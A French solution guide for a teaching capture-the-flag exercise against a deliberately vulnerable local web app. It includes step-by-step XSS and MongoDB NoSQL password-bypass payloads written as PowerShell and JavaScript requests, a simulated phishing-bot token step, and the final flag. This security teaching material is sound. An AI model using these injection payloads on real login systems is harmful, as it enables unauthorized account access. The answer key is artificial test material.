# CTF Vol 404 - Solutions

Ce document donne deux parcours complets pour résoudre le CTF de bout en bout.

| Parcours | Pour qui | Durée estimée |
|---|---|---|
| **A — PowerShell** | Professeur, correction rapide | ~5 min |
| **B — Navigateur** | Etudiants, pédagogique | ~1h |

---

## Prérequis (commun aux deux parcours)

```powershell
# Lancer l'application et la base de données
docker compose up -d --build

# Vérifier que tout tourne
docker compose ps
```

L'app est accessible sur **http://localhost:3000**

---

## Vue d'ensemble des étapes

```
1. Reconnaissance    → trouver passengers.html dans le code source
2. XSS              → injecter un payload dans le formulaire de login
3. NoSQL Injection  → bypass du mot de passe avec { $ne: '' }
4. Logs admin       → accéder à /auth/logs sans être admin
5. QR code + gate   → scanner le billet pour passer la porte
6. Cryptanalyse     → décoder RVN (Vigenère) + JN18ER (QTH Locator)
7. Phishing         → soumettre un lien au bot admin pour obtenir un token
8. Flag final       → soumettre le code département 94 → CTF{ORY_boarding_complete}
```

---

## Parcours A — PowerShell (correction rapide)

### Étape 1 — Vérifier les passagers

```powershell
(Invoke-RestMethod -Uri 'http://localhost:3000/billets/passengers').Count
# Résultat attendu : liste de passagers dont "alice"
```

### Étape 2 — Créer une session HTTP persistante

> Nécessaire pour garder les cookies entre les requêtes.

```powershell
$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
```

### Étape 3 — Déclencher la condition XSS

> Le backend détecte les balises HTML dans le champ username et marque xssDone = true.

```powershell
$xss = @{ username = '<img src=x onerror=alert(1)>'; password = 'wrong' } | ConvertTo-Json -Depth 4
try {
  Invoke-RestMethod -Uri 'http://localhost:3000/auth/login' -Method Post -ContentType 'application/json' -WebSession $session -Body $xss
} catch {}
```

### Étape 4 — Déclencher la condition NoSQL et se connecter

> Le mot de passe `{ $ne: '' }` signifie "différent de vide" → MongoDB retourne true → login accepté.

```powershell
$nosql = @{ username = 'alice'; password = @{ '$ne' = '' } } | ConvertTo-Json -Depth 4
Invoke-RestMethod -Uri 'http://localhost:3000/auth/login' -Method Post -ContentType 'application/json' -WebSession $session -Body $nosql
```

### Étape 5 — Lire les logs admin

> Cette route est accessible uniquement après XSS + NoSQL. Elle confirme que les conditions sont validées.

```powershell
Invoke-RestMethod -Uri 'http://localhost:3000/auth/logs' -WebSession $session
```

### Étape 6 — Récupérer le billet

> Le QR doit obligatoirement être scanné depuis billet.html dans un vrai navigateur.
> Le scan depuis le téléphone redirige automatiquement le PC vers le résultat du gate.

```powershell
$ticket = Invoke-RestMethod -Uri 'http://localhost:3000/billets/my' -WebSession $session
$ticket | Format-List
```

Le gate renvoie ce JSON :

```json
{
  "gate": "B7",
  "flightCode": "AF404",
  "message": "RVN",
  "hint": "QTH Locator : JN18ER",
  "indice": "La clé survole la banlieue parisienne..."
}
```

**Décodage :**
- `JN18ER` (QTH Locator) → coordonnées GPS → région **Val-de-Marne** → département **94**
- `RVN` (Vigenère, clé = DEPARTEMENT) → `ORY` = code IATA de Paris-Orly

### Étape 7 — Phishing : obtenir le token temporaire

> Le bot admin (worker 30s) accepte uniquement les URLs commençant par `/phish/page/`.
> Le token est valide 5 minutes et à usage unique.

```powershell
# 7a. Soumettre le lien de phishing
$report = Invoke-RestMethod -Uri 'http://localhost:3000/phish/report' `
  -Method Post -ContentType 'application/json' -WebSession $session `
  -Body (@{ url = '/phish/page/alice' } | ConvertTo-Json)
$reportId = $report.reportId
Write-Host "Report ID : $reportId"

# 7b. Attendre ~30 secondes puis récupérer le token
Start-Sleep -Seconds 35
$result = Invoke-RestMethod -Uri "http://localhost:3000/phish/result/$reportId" -WebSession $session
$phishToken = $result.token
Write-Host "Token : $phishToken"

# 7c. Utiliser le token pour débloquer la zone flag
Invoke-RestMethod -Uri 'http://localhost:3000/flag/unlock' `
  -Method Post -ContentType 'application/json' -WebSession $session `
  -Body (@{ token = $phishToken } | ConvertTo-Json)
```

### Étape 8 — Soumettre le code final

```powershell
$flag = Invoke-RestMethod -Uri 'http://localhost:3000/flag' `
  -Method Post -ContentType 'application/json' -WebSession $session `
  -Body (@{ code = 94 } | ConvertTo-Json)
$flag
```

**Résultat attendu :**

```
CTF{ORY_boarding_complete}
```

---

## Parcours B — Navigateur (pédagogique, sans PowerShell)

### Étape 1 — Reconnaissance

1. Ouvrir http://localhost:3000
2. Afficher le code source : **Ctrl+U**
3. Chercher une page cachée → trouver `passengers.html`
4. Ouvrir http://localhost:3000/passengers.html
5. Identifier la cible : **alice**

### Étape 2 — XSS

1. Ouvrir http://localhost:3000/login.html
2. Dans le champ **username**, saisir :

```
<img src=x onerror=alert(1)>
```

3. N'importe quoi en mot de passe → soumettre
4. La tentative est détectée → `xssDone = true` en base

### Étape 3 — NoSQL Injection (console DevTools)

1. Ouvrir les DevTools : **F12 → Console**
2. Coller et exécuter :

```javascript
fetch('/auth/login', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  credentials: 'include',
  body: JSON.stringify({
    username: 'alice',
    password: { $ne: '' }   // "différent de vide" → MongoDB accepte
  })
})
  .then(r => r.json())
  .then(console.log);
```

3. Résultat attendu : `{ ok: true, ... }` → connecté en tant qu'alice

### Étape 4 — Accès aux logs admin

Ouvrir directement dans le navigateur :

```
http://localhost:3000/auth/logs
```

La page liste les tentatives XSS et NoSQL enregistrées. Accessible sans être admin si les deux conditions précédentes sont remplies.

### Étape 5 — QR code et gate

1. Ouvrir http://localhost:3000/billet.html
2. Scanner le QR code avec le **téléphone**
3. Le téléphone affiche le JSON gate
4. Le **PC est automatiquement redirigé** vers le résultat

JSON reçu :

```json
{
  "gate": "B7",
  "flightCode": "AF404",
  "message": "RVN",
  "hint": "QTH Locator : JN18ER",
  "indice": "La clé survole la banlieue parisienne..."
}
```

### Étape 6 — Cryptanalyse

**But de cette étape :** trouver le **code final à envoyer plus tard** à la route `/flag`.

Ici, l'étape 6 **ne donne pas encore le flag**. Elle donne la **bonne valeur** à soumettre à la fin.

**Ce que l'étudiant doit faire concrètement :**

1. Regarder le JSON obtenu après le scan du QR
2. Repérer les deux indices : `RVN` et `JN18ER`
3. Comprendre que ces deux indices servent à retrouver une destination et un département
4. En déduire la valeur finale à envoyer plus tard

**Décoder QTH Locator `JN18ER` :**
- Outil : https://www.qth.app ou tout convertisseur QTH Locator
- `JN18ER` → Île-de-France, **Val-de-Marne** → département **94**

**Décoder Vigenère `RVN` :**
- Clé : `DEPARTEMENT` (indice = "la clé survole la banlieue parisienne" = département)
- `RVN` déchiffré → `ORY` = code IATA de **Paris-Orly**

**Ce qu'il faut retenir à la fin de l'étape 6 :**
- `ORY` confirme qu'on parle de **Paris-Orly**
- `Paris-Orly` est lié au **Val-de-Marne**
- donc le **code final à soumettre** sera **94**

Autrement dit :

```text
Étape 6 = je trouve la bonne réponse finale
Réponse finale = 94
```

**À ce moment-là, l'étudiant ne doit pas encore envoyer `94` à `/flag`.**

Pourquoi ?
- parce que la zone finale est encore verrouillée
- il faut d'abord faire l'étape phishing pour obtenir le droit d'entrer

### Étape 7 — Phishing (DevTools Console)

**But de cette étape :** débloquer l'accès à la zone finale.

Le point important est le suivant :

```text
Étape 6 donne la bonne réponse (94)
mais
Étape 7 donne le droit d'utiliser cette réponse
```

Sans le token phishing, même avec la bonne valeur `94`, la route `/flag` répondra `403` car la zone finale est encore verrouillée.

**Ce que l'étudiant doit comprendre ici :**
- `94` = la bonne réponse finale
- `token phishing` = la clé d'accès pour pouvoir soumettre cette réponse
- il faut donc faire **les deux**

**7a. Soumettre le report phishing** (dans la console, session active requise) :

```javascript
fetch('/phish/report', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  credentials: 'include',
  body: JSON.stringify({ url: '/phish/page/alice' })
})
  .then(r => r.json())
  .then(data => { console.log(data); window._reportId = data.reportId; });
```

**Ce que fait ce code :**
- il envoie un lien au module phishing
- le backend crée un report en statut `pending`
- il renvoie un `reportId`
- on stocke ce `reportId` dans `window._reportId` pour le réutiliser facilement ensuite

**Ce que l'étudiant doit faire juste après :**

1. Vérifier qu'un objet s'affiche dans la console
2. Vérifier qu'il contient bien un `reportId`
3. Ne pas fermer l'onglet tout de suite
4. Copier ce `reportId` si besoin

**7b. Vérifier le résultat sur flag.html :**

1. Ouvrir http://localhost:3000/flag.html
2. Coller `window._reportId` dans le champ **Report ID**
3. Cliquer sur **Vérifier résultat**
4. Si `pending` → attendre 30s et recliquer
5. Quand `success` → `window._phishToken` est rempli automatiquement

**Ce qui se passe côté backend :**
- le worker passe toutes les 30 secondes
- il lit un report `pending`
- si l'URL commence bien par `/phish/page/`, il génère un token temporaire
- ce token est ensuite renvoyé au front
- le front le place dans `window._phishToken`

**Ce que l'étudiant doit voir à l'écran :**
- un message du type `Token récupéré`
- un compte à rebours du token
- la variable `window._phishToken` disponible dans la console

**Si l'étudiant voit `pending` :**
- ce n'est pas une erreur
- cela veut juste dire que le worker n'est pas encore passé
- il faut attendre puis recliquer sur **Vérifier résultat**

**7c. Débloquer la zone flag** (obligatoire en console, pas de bouton) :

```javascript
fetch('/flag/unlock', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  credentials: 'include',
  body: JSON.stringify({ token: window._phishToken })
})
  .then(r => r.json())
  .then(console.log);
// Résultat attendu : { success: true, redirect: '/flag.html' }
```

**Ce que fait ce code :**
- il envoie le token à `/flag/unlock`
- le backend vérifie que le token est correct, non expiré, et pas déjà utilisé
- si c'est bon, il met `flagUnlocked = true` dans la session

**Ce que l'étudiant doit vérifier après exécution :**
- dans la console : `{ success: true, redirect: '/flag.html' }`
- sur la page : un message qui dit que la zone finale est débloquée
- si besoin, recharger `flag.html`

Autrement dit :

```text
Étape 7 = j'obtiens l'autorisation d'entrer dans la dernière zone
```

### Étape 8 — Flag final

**Maintenant seulement**, la zone flag est déverrouillée.

Tu peux donc envoyer la valeur trouvée à l'étape 6, c'est-à-dire `94`.

La logique complète est :

```text
Étape 6 → je découvre 94
Étape 7 → je débloque l'accès avec le token
Étape 8 → j'envoie 94 à /flag
```

**Ce que l'étudiant doit faire concrètement :**

1. Garder en tête la valeur trouvée à l'étape 6 : `94`
2. Vérifier que la zone finale est bien déverrouillée
3. Exécuter la requête ci-dessous dans la console
4. Lire la réponse renvoyée par le serveur

Soumettre le code :

```javascript
fetch('/flag', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  credentials: 'include',
  body: JSON.stringify({ code: 94 })
})
  .then(r => r.json())
  .then(console.log);
```

**Pourquoi `code: 94` ?**
- parce que l'étape 6 a permis de retrouver le département associé à la destination
- `/flag` attend justement ce code département
- comme la session a déjà été déverrouillée à l'étape 7, le backend accepte maintenant la réponse

**Ce que l'étudiant doit voir à la fin :**

```json
{ "flag": "CTF{ORY_boarding_complete}" }
```

Si l'étudiant reçoit une erreur :
- `403` → la zone n'a pas été déverrouillée, refaire l'étape 7
- `400` → mauvaise valeur envoyée, revérifier l'étape 6

**Résultat attendu :**

```
CTF{ORY_boarding_complete}
```

---

## Notes prof — dépannage rapide

| Problème | Solution |
|---|---|
| Le scan ouvre `localhost` sur le téléphone | Vérifier `PUBLIC_BASE_URL` dans `.env` (mettre l'IP LAN) |
| Le téléphone ne charge pas l'URL | Vérifier même Wi-Fi + firewall Windows port 3000 |
| Le QR ne redirige pas le PC | Recharger `billet.html` → nouveau `scanId` généré |
| La session expire | Refaire login NoSQL puis reprendre à l'étape billet |
| Token phishing invalide | Token à usage unique ou expiré (5 min) → refaire étape 7 |
| `pending` après 30s | Worker traite 1 report par cycle → attendre encore 30s |

